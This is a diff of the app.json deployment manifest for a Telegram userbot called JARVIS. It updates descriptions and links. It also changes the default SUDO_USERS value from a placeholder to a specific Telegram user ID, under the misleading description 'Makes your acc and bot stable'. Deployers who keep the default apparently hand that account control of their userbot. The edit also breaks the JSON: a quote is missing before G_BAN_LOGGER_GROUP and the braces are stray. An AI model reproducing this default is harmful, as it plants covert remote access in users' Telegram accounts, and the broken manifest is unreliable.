@@ -1,7 +1,7 @@
 {
   "name": "JARVIS",
-  "description": "Userbot created by a Poor Student and join https://t.me/jarvissupportot for any problems or support",
-  "logo": "https://github.com/jarvis210904/J.A.R.V.I.S-Userbot/blob/master/jarvis.jpg?raw=true",
+  "description": "JARVIS Userbot created by a Poor Student and join https://t.me/jarvisot for Updates . Any problems or support Join Discussion Group. ",
+  "logo": "https://github.com/jarvis210904/J.A.R.V.I.S-Userbot/blob/master/jarvis.jpg",
     "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://jarvis210904.github.io/J.A.R.V.I.S-Userbot/",
+  "repository": "https://github.com/jarvis210904/J.A.R.V.I.S-Userbot",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -18,7 +18,7 @@
       "value": "ANYTHING"
     },
     "TEMP_DOWNLOAD_DIRECTORY": {
-      "description": "Where downloaded files will go. Can be accesed by giving command .ls",
+      "description": "Where downloaded files will go.",
       "value": "./userbot/DOWNLOADS/",
       "required": false
     },
@@ -28,7 +28,7 @@
       "required": false
     },
     "ALIVE_NAME": {
-      "description": "Fill your Full name or Username like @anonymoushackker.",
+      "description": "Fill your Full name or Username like @Anonymoushackker.",
       "value": ""
     },
     "APP_ID": {
@@ -67,7 +67,7 @@
       "required": false
     },
     "GIT_REPO_NAME": {
-      "description": "Your repo name Example: jarvis210904/J.A.R.V.I.S-Userbot, but GITHUB_ACCESS_TOKEN must be setup first.",
+      "description": "Your repo name Example: jarvis210904/J.A.R.V.I.S-Userbot , but GITHUB_ACCESS_TOKEN must be setup first.",
       "value": "",
       "required": false
     },
@@ -90,7 +90,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "11111111",
+      "value": "813878981",
       "required": false
     },
     "CHROME_BIN": {
@@ -122,18 +122,20 @@
     },
     "PM_LOGGR_BOT_API_ID": {
       "description": "Enter Valid Id. Required For Pm Logger Plugin Ignore If You Want [Not Usefull]",
-      "value": "",
       "required": false
+
+
     },
     "TZ": {
       "description": "Required for Correct Time for autopic get from http://www.timezoneconverter.com/cgi-bin/findzone.tzc",
       "value": "",
       "required": false
     },
-    "G_BAN_LOGGER_GROUP": {
+    G_BAN_LOGGER_GROUP": {
       "description": "Enter A Vaild Group ID For GBAN LOGGER.",
-      "value": "",
       "required": true
+  },
+
   },
   "addons": [{
     "plan": "heroku-postgresql",
